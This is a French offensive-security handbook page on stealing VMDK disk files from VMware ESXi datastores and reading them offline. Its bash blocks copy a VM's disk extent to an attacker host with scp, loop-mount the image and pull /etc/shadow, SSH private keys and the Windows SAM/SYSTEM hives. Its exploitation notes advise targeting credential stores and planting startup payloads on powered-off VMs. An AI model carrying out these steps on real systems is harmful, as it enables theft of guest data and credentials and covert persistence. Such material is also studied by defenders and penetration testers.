---
order: 2
title: "Vol de datastore et de VMDK : s'emparer des disques virtuels et de leurs données"
description: "ESXi stocke les disques virtuels de chaque VM sous forme de fichiers VMDK sur des datastores (VMFS ou NFS). Avec un accès à l'hôte ou au datastore, un attaquant copie les fichiers VMDK et lit leurs systèmes de fichiers hors ligne, extrayant les données, identifiants et secrets de chaque invité sans jamais entrer dans les VM en cours d'exécution, et peut aussi altérer disques ou snapshots avant le démarrage d'une VM."
keywords:
  - vmdk
  - datastore
  - vmfs
  - disque virtuel
  - accès hors ligne
---

# Vol de datastore et de VMDK

Les disques de chaque machine virtuelle ESXi existent sous forme de fichiers VMDK sur un datastore, soit VMFS sur stockage local ou SAN, soit un partage NFS monté. L'accès au datastore, depuis un shell hôte, une API de gestion ou le stockage sous-jacent, permet à un attaquant de copier ces fichiers VMDK et de lire leurs systèmes de fichiers hors ligne. Cela contourne tous les contrôles internes à l'invité : pas de connexion, pas d'EDR, pas d'isolation d'invité, juste l'image disque brute, d'où l'attaquant extrait les fichiers, les hashes de mots de passe, les clés et les secrets applicatifs de l'invité. Le même accès permet l'altération, en plaçant un payload sur le disque d'une VM éteinte qui s'exécute à son prochain démarrage.

## Localiser et copier les disques

```bash
# on an ESXi host shell, datastores are under /vmfs/volumes
ls -la /vmfs/volumes/
find /vmfs/volumes -name '*.vmdk' | grep -v -- '-flat\|-delta'   # descriptors
# a VMDK is a small descriptor plus a large -flat (or -sparse/-delta) extent
cat /vmfs/volumes/<ds>/<vm>/<vm>.vmdk                            # descriptor names the extent
# copy the flat extent (the actual disk image) off the host
scp /vmfs/volumes/<ds>/<vm>/<vm>-flat.vmdk attacker@host:/loot/
```

## Lire le disque hors ligne

```bash
# mount the flat extent's filesystem read-only elsewhere (it is a raw disk image)
# find the partition offset, then loop-mount
fdisk -l <vm>-flat.vmdk
mount -o ro,loop,offset=$((2048*512)) <vm>-flat.vmdk /mnt/guest
# harvest from the guest filesystem
cat /mnt/guest/etc/shadow /mnt/guest/root/.ssh/id_* 2>/dev/null
reg="/mnt/guest/Windows/System32/config"; ls "$reg"/SAM "$reg"/SYSTEM 2>/dev/null
# tamper path: write a startup payload, then let the VM boot
```

Pour un invité Windows, les ruches SAM et SYSTEM copiées permettent l'extraction de hashes hors ligne ; pour Linux, `/etc/shadow` et les clés SSH. Les fichiers delta de snapshot (`-delta.vmdk`, `-00000N.vmdk`) et le snapshot mémoire (`.vmsn`/`.vmem`) étendent cela aux secrets en mémoire au moment du snapshot.

## Notes d'exploitation

- Copier l'extent `-flat` (ou sparse/delta) est le vol de données ; le petit descripteur `.vmdk` ne fait que nommer l'extent, donc récupérez l'extent pour le contenu réel.
- Le montage hors ligne contourne toutes les défenses côté invité ; priorisez les magasins d'identifiants (SAM/SYSTEM, `/etc/shadow`, clés SSH et cloud) qui déverrouillent d'autres systèmes.
- Les fichiers de snapshot mémoire (`.vmem`) capturés avec un snapshot contiennent des secrets actifs (clés, tokens, données déchiffrées) de l'instant du snapshot ; découpez-les comme une image mémoire.
- L'accès en écriture au datastore permet l'altération pré-démarrage : placez un service, un cron ou une entrée de démarrage sur le disque d'une VM éteinte pour exécution au prochain démarrage.

## Outils

- [libguestfs / guestmount (offline VM disk access)](https://libguestfs.org/)

## Références

- [VMware: VMFS and virtual disk formats](https://docs.vmware.com/en/VMware-vSphere/index.html)
- [VMware VMDK format specification](https://www.vmware.com/app/vmdk/?src=vmdk)
